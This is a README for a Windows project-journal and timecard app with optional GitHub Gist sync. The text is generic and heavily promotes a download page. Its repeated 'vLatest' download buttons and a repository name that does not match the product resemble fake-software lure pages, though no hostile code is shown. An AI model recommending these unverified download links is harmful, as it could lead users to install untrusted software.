# Project Journal & Timecard vLatest - desktop productivity app 2026

> **A Windows desktop journal and timecard tool for project tracking, time logging, budget notes, and optional GitHub Gist sync, delivered as a Tauri-based app with installer builds.**

[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-vLatest-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/jwood76/chiaro-tinker-tools-win-36391?style=flat-square)](https://github.com/jwood76/chiaro-tinker-tools-win-36391)

---

<p align="center">
  <a href="https://jwood76.github.io/chiaro-tinker-tools-win-36391/">
    <img src="https://img.shields.io/badge/Download-Project%20Journal%20%26%20Timecard%20Latest-brightgreen?style=for-the-badge" alt="Download Project Journal & Timecard">
  </a>
</p>

> **[Direct Download - Project Journal & Timecard vLatest](https://jwood76.github.io/chiaro-tinker-tools-win-36391/)**

---

[Download Latest Build](https://jwood76.github.io/chiaro-tinker-tools-win-36391/)

---

## About Project Journal & Timecard

Project Journal & Timecard is a single-file desktop app built for staying on top of project work in one place. It combines project tracking, daily time logging, budget notes, and journal-style entries so you can keep operational details together instead of spread across separate tools.

The app is aimed at Windows users who want a compact productivity workspace with a native wrapper and an installer-based distribution. It also supports optional cross-machine sync through GitHub Gist, which makes it easier to carry records between devices when that workflow fits your setup.

---

## Features

- Tracks projects in a focused desktop workspace
- Logs daily time entries alongside project activity
- Stores budget-related notes for quick reference
- Keeps written notes close to the work they describe
- Supports optional sync through GitHub Gist
- Packaged as a native Windows app using Tauri
- Built as a single-file desktop application
- Uses GitHub Actions to generate installer builds

---

## Installation

1. Download the latest build from the download link above.
2. Install the Windows package or open the distributed app bundle, depending on the release format.
3. Launch the app from the Start Menu or from the installed location.

If you are building from source instead of using a release, clone the repository and run the project using the Tauri workflow defined in the repo.

---

## Usage

Use the app as a daily workspace for tracking what you worked on, how long you spent, and any budget or project notes you want to retain.

Typical workflow:
1. Create or open a project entry.
2. Add time records for the day.
3. Record notes about progress, costs, or follow-up items.
4. Review the project history when you need a status snapshot.
5. Enable GitHub Gist sync if you want the same data available across machines.

---

## Configuration

Settings are handled inside the app, with sync-related options tied to the GitHub Gist workflow.

Typical sync fields may include:

    {
      "syncProvider": "GitHub Gist",
      "syncEnabled": true,
      "deviceName": "Windows-PC"
    }

If you are not using sync, you can keep the app local and manage your data entirely on the current machine.

---

## Requirements

- Windows desktop environment
- Runtime compatible with a Tauri-based desktop app
- Enough local storage for project records, notes, and time entries
- GitHub account if you plan to use GitHub Gist sync
- Network access for downloading installer builds and using cloud sync features

---

## FAQ

**Is cloud sync required?**  
No. GitHub Gist sync is optional. You can use the app locally without connecting a sync account.

**How do I update the app?**  
Check the release link for the newest build and install the latest available package.

**Where are settings stored?**  
Settings are managed inside the app, with sync preferences associated with the GitHub Gist workflow.

**What should I do if sync is not working?**  
Verify your GitHub credentials, confirm Gist access, and make sure the app has network access.

**Can I use it for more than one project?**  
Yes. The app is designed around project tracking, so you can keep separate entries for different jobs or initiatives.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
